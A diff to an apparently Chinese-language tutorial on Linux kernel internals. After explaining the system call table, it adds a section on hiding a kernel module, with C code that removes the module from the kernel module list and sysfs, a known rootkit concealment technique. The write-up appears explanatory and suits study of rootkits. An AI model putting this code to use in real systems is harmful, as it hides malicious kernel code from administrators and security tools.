@@ -220,3 +220,38 @@ getdents(3, /* 0 entries */, 32768)     = 0
 在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
 系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。
  
+ 
+ 
+ 
+ 
+ 
+隐藏模块。具体功能如下：
+
+- 记录当前模块的链表前驱节点。
+- 从模块链表中删除当前模块。
+- 记录当前模块的kobject链表前驱节点。
+- 删除模块的kobject。
+- 从kobject链表中删除当前模块。
+
+ 
+```bash
+
+
+static struct list_head *module_previous;
+static struct list_head *module_kobj_previous;
+static char module_hidden = 0;
+
+
+void module_hide(void)
+{
+	if (module_hidden) return;
+	module_previous = THIS_MODULE->list.prev;
+	list_del(&THIS_MODULE->list);
+	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
+	kobject_del(&THIS_MODULE->mkobj.kobj);
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+	module_hidden = !module_hidden;
+}
+ 
+ 
+ ```
